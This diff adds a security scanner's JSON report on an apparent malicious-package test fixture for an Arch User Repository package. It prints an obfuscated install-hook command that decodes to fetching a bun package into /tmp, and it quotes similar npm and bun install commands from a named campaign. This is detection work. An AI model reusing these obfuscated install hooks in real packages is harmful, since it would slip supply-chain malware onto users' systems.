@@ -1,0 +1,88 @@
+{
+  "package_name": "htbrowser-bin",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun to install packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch npm/bun packages during the install phase.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install",
+        "line": 2,
+        "column": 14,
+        "snippet": "  $'\\x63'\"d\" \"/\"'t'\"m\"'p' && \"b\"'u''n' 'a''d''d' $'\\141\\x6e''s'\"i\"-'c''o''l''o''r'$'\\x73'-'n'\"e\"'x''t''f''i''l''e''-''j''s'    [de-obfuscated →   cd /tmp && bun add ansi-colors-nextfile-js]"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "bun add"
+      }
+    },
+    {
+      "id": "OBF-003",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Hex-encoded payload (install script)",
+      "description": "Hex encoding can hide malicious payloads",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install",
+        "line": 2,
+        "column": 5,
+        "snippet": "  $'\\x63'\"d\" \"/\"'t'\"m\"'p' && \"b\"'u''n' 'a''d''d' $'\\141\\x6e''s'\"i\"-'c''o''l''o''r'$'\\x73'-'n'\"e\"'x''t''f''i''l''e''-''j''s'"
+      },
+      "recommendation": "Decode and review hex-encoded content",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "\\x63"
+      }
+    },
+    {
+      "id": "OBF-006",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Quote-splitting / character obfuscation (install script)",
+      "description": "A command is assembled from adjacent single-character quoted fragments (e.g. \"b\"'u''n') or ANSI-C escapes to hide it from literal matching. This is almost exclusively a malware evasion technique; aur-scan also reports the decoded command via its other rules.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install",
+        "line": 2,
+        "column": 17,
+        "snippet": "  $'\\x63'\"d\" \"/\"'t'\"m\"'p' && \"b\"'u''n' 'a''d''d' $'\\141\\x6e''s'\"i\"-'c''o''l''o''r'$'\\x73'-'n'\"e\"'x''t''f''i''l''e''-''j''s'"
+      },
+      "recommendation": "De-obfuscate the command and review what it actually runs.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "'t'\"m\"'p'"
+      }
+    },
+    {
+      "id": "CHK-005",
+      "severity": "high",
+      "category": "cryptography",
+      "title": "All non-VCS sources use SKIP checksum",
+      "description": "No integrity verification is performed on 1 non-VCS source(s)",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Provide real checksums for non-VCS sources",
+      "cwe_id": "CWE-354",
+      "metadata": {
+        "non_vcs_source_count": 1,
+        "vcs_source_count": 0
+      }
+    }
+  ],
+  "scanned_files": [
+    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/PKGBUILD",
+    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/obfuscated-install/htbrowser-bin-deps.install"
+  ],
+  "timestamp": "2026-06-15T01:57:17.053628888Z",
+  "scan_duration_ms": 2
+}
